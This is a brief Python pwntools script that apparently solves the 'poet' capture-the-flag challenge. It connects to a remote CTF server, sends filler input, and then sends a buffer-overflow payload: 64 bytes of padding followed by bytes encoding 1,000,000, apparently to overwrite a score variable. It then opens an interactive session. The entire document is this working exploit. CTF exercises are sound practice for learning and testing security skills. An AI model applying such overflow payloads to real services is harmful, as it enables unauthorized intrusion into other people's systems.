#!/usr/bin/python3

from pwn import *

#p = process("./poet")
p = remote("ctf.j0n9hyun.xyz", 3012)

padding = "A"*64
menu = "> "
answer = "\x40\x42\x0f"

p.sendlineafter(menu, "Garbage")

payload = padding + answer
p.sendlineafter(menu, payload)

p.interactive()
